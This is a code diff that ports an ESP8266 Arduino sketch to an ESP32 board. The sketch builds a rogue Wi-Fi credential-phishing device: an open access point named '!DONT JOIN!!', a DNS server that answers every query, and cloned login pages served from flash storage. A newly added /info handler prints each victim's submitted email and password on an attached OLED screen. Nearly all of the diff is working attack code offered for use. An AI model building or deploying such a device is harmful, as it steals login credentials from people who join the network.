@@ -1,11 +1,26 @@
+#include "Arduino.h"
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
 #include "DNSMessage.h"
 #include "FS.h"
+#include "SPIFFS.h"
+#include "ESP32WebServer.h"
 //#include <ESP8266WebServerSecure.h>
 //Bits are left to right - total 8 bits
 
+#ifndef LED_BUILTIN
+#define LED_BUILTIN 2
+#endif
 
+#define TOUCH_BTN_PIN T9 //GPIO 32
+#define OLED_RESET 4
+Adafruit_SSD1306 display(OLED_RESET);
+
+#if (SSD1306_LCDHEIGHT != 64)
+#error("Height incorrect, please fix Adafruit_SSD1306.h!");
+#endif
 //------PAYLOAD ----------------<img src='im.png' height='2000' width='1500'/>
-char payload[] = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style> body, html {height: 100%; margin: 0;}.bg {background-image: url('im.png');height: 100%;background-position: center;background-repeat: no-repeat;background-size: contain;}</style></head><body><div class='bg'></div></body></html>";
+//char payload[] = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style> body, html {height: 100%; margin: 0;}.bg {background-image: url('im.png');height: 100%;background-position: center;background-repeat: no-repeat;background-size: contain;}</style></head><body><div class='bg'></div></body></html>";
 
 /* Set these to your desired credentials. */
 static const uint8_t x509[] PROGMEM = {
@@ -69,13 +84,14 @@ static const uint8_t rsakey[] PROGMEM = {
   0xd5, 0xdf, 0x34, 0xeb, 0x26, 0x03
 };
 //1AManInTh3Middl3
-const char *ssid = "DONT JOIN!!";
+const char *ssid = "!DONT JOIN!!";
 const char *password = "";
+IPAddress apIP(192, 168, 1, 1);
 
 char incomingPacket[255];
 
-ESP8266WebServerSecure server(443);
-ESP8266WebServer httpserver(80);
+//ESP8266WebServerSecure server(443);
+ESP32WebServer httpserver(80);
 WiFiUDP DNSserver;
 //ESP8266WebServerSecure httpserver(8080);
 
@@ -87,9 +103,9 @@ IPAddress myIP;
 void blink(int amount, int length, int halt){
   int blinks = 0;
   while(blinks<amount){
-    digitalWrite(LED_BUILTIN, LOW);
-    delay(length);
     digitalWrite(LED_BUILTIN, HIGH);
+    delay(length);
+    digitalWrite(LED_BUILTIN, LOW);
     delay(halt);
     blinks++;
   }
@@ -117,10 +133,12 @@ void printField(Packet *packet){
 }
 
 
-void handleHttpsRoot() {
+/*void handleHttpsRoot() {
   Serial.println("HTTPS Request recieved. ");
 	server.send(200, "text/html", payload);
-}
+}*/
+
+
 void handleHttpRoot(){
   Serial.println("HTTP Request recieved. ");
   File f;
@@ -131,15 +149,15 @@ void handleHttpRoot(){
     Serial.print("Fatal fail!");
     while(1);
 }
-  //httpserver.streamFile(f,"text/html");
-  char buf[1024];
+  httpserver.streamFile(f,"text/html");
+  /*char buf[1024];
    int siz = f.size();
    while(siz > 0) {
      size_t len = std::min((int)(sizeof(buf) - 1), siz);
      f.read((uint8_t *)buf, len);
      httpserver.client().write((const char*)buf, len);
      siz -= len;
-   }
+   }*/
   Serial.println("Closing file...");
   f.close();
   Serial.println("Done!");
@@ -207,8 +225,8 @@ void handleProfile(){
    while(siz > 0) {
      size_t len = std::min((int)(sizeof(buf) - 1), siz);
      f.read((uint8_t *)buf, len);
-     Serial.println(siz);
-     Serial.println(len);
+     //Serial.println(siz);
+     //Serial.println(len);
      httpserver.client().write((const char*)buf, len);
 
      siz -= len;
@@ -240,7 +258,7 @@ void handleFooter(){
   f.close();
   Serial.println("Done!");
 }
-void handleHttpsImage(){
+/*void handleHttpsImage(){
   Serial.println("Loading resource...");
   File f;
   if(SPIFFS.begin()){
@@ -257,7 +275,7 @@ Serial.println("Streaming Resource...(HTTPS)");
   Serial.println("Closing file...");
   f.close();
   Serial.println("Done!");
-}
+}*/
 
 
 void handleHttpImage(){
@@ -280,9 +298,32 @@ Serial.println("Streaming Resource...(HTTP)");
   Serial.println("Done!");
 }
 
+void showInfo(){
+  //Will implement screen.
+   //Serial.println(httpserver.arg("pass"));
+   //Serial.println(httpserver.arg("mail"));
+   display.println("----------------");
+   display.print("Email: ");
+   display.println(httpserver.arg("mail"));
+   display.print("Password: ");
+   display.println(httpserver.arg("pass"));
+   display.display();
+   delay(2000);
+}
+
 void setup() {
 	delay(4000);
 	Serial.begin(9600);
+  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
+  display.display();
+  delay(2000);
+  display.clearDisplay();
+
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0,0);
+  display.println("Welcome!");
+  display.display();
 
   pinMode(LED_BUILTIN, OUTPUT);
   blink(1,2000,1000);
@@ -303,7 +344,9 @@ void setup() {
 	Serial.println("Configuring access point...");
 	/* You can remove the password parameter if you want the AP to be open. */
 
-	WiFi.softAP(ssid, password);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(ssid);
   //WiFi.clients();
 
 	myIP = WiFi.softAPIP();
@@ -312,12 +355,12 @@ void setup() {
   blink(1,500,250);
 
   //Setting TLS http server
-  server.setServerKeyAndCert_P(rsakey, sizeof(rsakey), x509, sizeof(x509));
-	server.on("/", handleHttpsRoot);
-  server.on("/im.png", handleHttpsImage);
+  //server.setServerKeyAndCert_P(rsakey, sizeof(rsakey), x509, sizeof(x509));
+	//server.on("/", handleHttpsRoot);
+  //server.on("/im.png", handleHttpsImage);
 
-	server.begin();
-  blink(1,500,250);
+	//server.begin();
+  //blink(1,500,250);
 
   //Setting HTTP server
   httpserver.on("/", handleHttpRoot);
@@ -326,6 +369,7 @@ void setup() {
   httpserver.on("/profile-img.png", handleProfile);
   httpserver.on("/footer-logo.png", handleFooter);
   httpserver.on("/style.css", handleStyle);
+  httpserver.on("/info",showInfo);
 	httpserver.begin();
   blink(1,500,250);
 
@@ -338,7 +382,7 @@ void setup() {
 void loop() {
 
 
-	server.handleClient();
+	//server.handleClient();
   httpserver.handleClient();
 
 
@@ -371,13 +415,22 @@ void loop() {
     // send back a reply, to the IP address and port we got the packet from
     DNSserver.beginPacket(DNSserver.remoteIP(), DNSserver.remotePort());
     //Serial.println(msg->response.size);
-    DNSserver.write(msg->response.buffer, msg->response.size);
+    DNSserver.write((const uint8_t*)(msg->response.buffer), msg->response.size);
     DNSserver.endPacket();
     delete msg;
   }else{
     Serial.println("Problem making response...");
     delete msg;
   }
+  }
+
+
+
+
+  int touch_value = touchRead(TOUCH_BTN_PIN);
+  //Serial.println(touch_value);
+  if(touch_value<30){
+    blink(1,100,0);
   }
 
 }
